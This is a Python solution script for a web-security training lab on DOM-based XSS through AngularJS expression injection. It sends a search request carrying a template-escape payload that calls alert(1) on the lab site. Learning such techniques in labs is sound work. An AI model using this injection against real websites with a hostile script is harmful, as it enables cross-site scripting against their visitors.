#############################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 19/11/2023
#
# Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
#
# Steps: 1. Inject payload in the search query parameter to call the alert function
#        2. Observe that the script has been executed
#
#############################################################################################


###########
# imports
###########
import requests
from colorama import Fore


#########
# Main
#########

# change this to your lab URL
url = "https://0a3d002504d9962d8325b579009700f2.web-security-academy.net"

# payload to call the alert function
payload = "{{constructor.constructor('alert(1)')()}}"

try:
    # fetch the page with the injected payload
    requests.get(f"{url}?search={payload}")

except:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
    exit(1)

print(Fore.WHITE + "❯❯ Injecting payload in the search query parameter to call the alert function.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")



